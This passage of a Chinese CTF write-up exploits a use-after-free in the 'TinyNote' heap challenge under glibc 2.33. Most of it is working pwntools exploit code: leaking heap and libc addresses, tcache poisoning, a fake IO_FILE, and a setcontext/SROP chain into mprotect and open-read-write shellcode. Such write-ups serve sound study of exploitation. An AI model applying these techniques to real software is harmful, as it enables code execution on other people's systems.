<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_15B1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1240(<span class="string">"Index:"</span>);</span><br><span class="line">  LODWORD(v0) = sub_1465();</span><br><span class="line">  v2 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = chunk_buf[(<span class="keyword">signed</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1240(<span class="string">"Content:"</span>);</span><br><span class="line">      LODWORD(v0) = write(<span class="number">1</span>, chunk_buf[v2], <span class="number">0x10</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br></pre></td></tr></table></figure>

<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>存在uaf漏洞，free之后没有把指针清空</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_1626</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1240(<span class="string">"Index:"</span>);</span><br><span class="line">  v0 = sub_1465();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> &amp;&amp; v0 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_buf[v0] )</span><br><span class="line">      <span class="built_in">free</span>(chunk_buf[v0]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-利用分析"><a href="#2-2-利用分析" class="headerlink" title="2.2 利用分析"></a>2.2 利用分析</h3><ol>
<li>利用uaf首先把heap地址和libc地址泄漏出来</li>
<li>因为只能申请0x10大小的chunk，因此利用[fastbin_reverse_into_tcache](<a href="https://wood1314.github.io/year/09/15/ckw6j4s0s001n4r3fm19r0b5t/#more">house_of_botcake &amp;&amp; fastbin_reverse_into_tcache | 木头的小木屋 (wood1314.github.io)</a>)进行一个任意地址写堆地址。这个时候由于libc2-33的对齐保护，所以_IO_list_all是不能劫持的，stderr等也不能直接劫持，只能选择<code>_IO_2_1_stderr</code>的chain字段，利用我们tcache的key来劫持，正好可以劫持到heapbase+0x10的位置。这里不用fd字段劫持的原因是，fd字段会被抑或成一个很奇怪的字段，影响后续利用。</li>
<li>伪造IO_FILE结构，劫持控制流执行orw</li>
</ol>
<h3 id="2-3-利用过程"><a href="#2-3-利用过程" class="headerlink" title="2.3 利用过程"></a>2.3 利用过程</h3><h4 id="预备工作"><a href="#预备工作" class="headerlink" title="预备工作"></a>预备工作</h4><p>使用patch-elf修改题目libc为对应版本的glibc-all-in-one中的libc，方便带符号调试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so ./TinyNote</span><br><span class="line"></span><br><span class="line">patchelf --replace-needed libc.so.6 /home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6 ./TinyNote</span><br></pre></td></tr></table></figure>

<h4 id="泄漏heap-地址和libc-地址"><a href="#泄漏heap-地址和libc-地址" class="headerlink" title="泄漏heap 地址和libc 地址"></a>泄漏heap 地址和libc 地址</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"># context.log_level = 'DEBUG'</span><br><span class="line">context.os = 'linux'</span><br><span class="line">context.arch = 'amd64'</span><br><span class="line">libc = ELF('/home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6')</span><br><span class="line">sh = process('./TinyNote')</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil('Choice:')</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Add</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">Dlete</span><span class="params">(idx)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Menu</span><span class="params">(<span class="number">4</span>)</span></span></span><br><span class="line">    sh.recvuntil(':')</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line">Add(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">key = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success('heapbase: ' + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">0x31</span>)</span>:</span></span><br><span class="line"><span class="function">    <span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x330</span>)))</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Edit</span><span class="params">(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x340</span>)))</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Dlete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">Show</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">sh.recvuntil(':')</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x1e0c00</span>  </span><br><span class="line"></span><br><span class="line">log.success('libc_base: ' + hex(libc_base))</span><br></pre></td></tr></table></figure>

<h4 id="构造fake-FILE"><a href="#构造fake-FILE" class="headerlink" title="构造fake_FILE"></a>构造fake_FILE</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">IO_str_vtable = libc_base + <span class="number">0x1e2560</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">setcontext = libc_base + <span class="number">0x52970</span> + <span class="number">61</span></span><br><span class="line">gadget = libc_base + <span class="number">0x000000000014a0a0</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x500</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x508</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable) </span><br><span class="line">payload = fake_IO_FILE + <span class="string">b'/bin/sh\x00'</span> + <span class="number">2</span>*p64(setcontext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span> + <span class="number">1</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x20</span> + <span class="number">0x10</span>*i)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>:(i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br></pre></td></tr></table></figure>

<h4 id="为后面的利用提前布置一些地址"><a href="#为后面的利用提前布置一些地址" class="headerlink" title="为后面的利用提前布置一些地址"></a>为后面的利用提前布置一些地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># put free_hook on tcache in 0x80 size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0xc0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((free_hook)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set tcache size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x101000000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write rdi address </span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x500</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(gadget) + p64(<span class="number">0x300</span> + heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set shellcode addr</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x520</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x900</span>))</span><br></pre></td></tr></table></figure>

<h4 id="设置SROP的frame以及shellcode"><a href="#设置SROP的frame以及shellcode" class="headerlink" title="设置SROP的frame以及shellcode"></a>设置SROP的frame以及shellcode</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># set frame</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rax,0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,1024</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rax,60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x528</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">'mprotect'</span>] + libc_base</span><br><span class="line">payload = bytes(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x300</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x320</span>)))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(setcontext))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # set shellcode in heap</span></span><br><span class="line">payload = bytes(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x900</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br></pre></td></tr></table></figure>

<h4 id="构造-fastbin-reverse-to-tcache"><a href="#构造-fastbin-reverse-to-tcache" class="headerlink" title="构造 fastbin_reverse_to_tcache"></a>构造 fastbin_reverse_to_tcache</h4><p>这里注意要把fastbin填为8个，这样的话就不会在reverse_into_tcache的时候引入别的chunk。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># #Create a fake fastbin chains</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x820</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x830</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x840</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x850</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x860</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x870</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x880</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x890</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8a0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x8b0</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8c0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] + <span class="number">0x60</span> - <span class="number">0x10</span>) ^ key)+ p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x90</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Dlete(<span class="number">1</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(key ^ (heap_base + <span class="number">0x810</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(key))</span><br><span class="line">Add(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>在此时fastbin的状态如下</p>
<p><img src="https://pic.imgdb.cn/item/619bc6992ab3f51d91b93e94.png" alt></p>
<p>然后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add(0)</span><br></pre></td></tr></table></figure>

<p>大胜利！</p>
<p><img src="https://pic.imgdb.cn/item/619bc70d2ab3f51d91b97566.png" alt></p>
<h3 id="0x03-完成exp"><a href="#0x03-完成exp" class="headerlink" title="0x03 完成exp"></a>0x03 完成exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">libc = ELF(<span class="string">'/home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6'</span>)</span><br><span class="line">sh = process(<span class="string">'./TinyNote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx)</span>:</span></span><br><span class="line">    Menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    Menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    Menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dlete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    Menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line">Add(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">key = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">'heapbase: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x31</span>):</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x330</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x340</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Dlete(<span 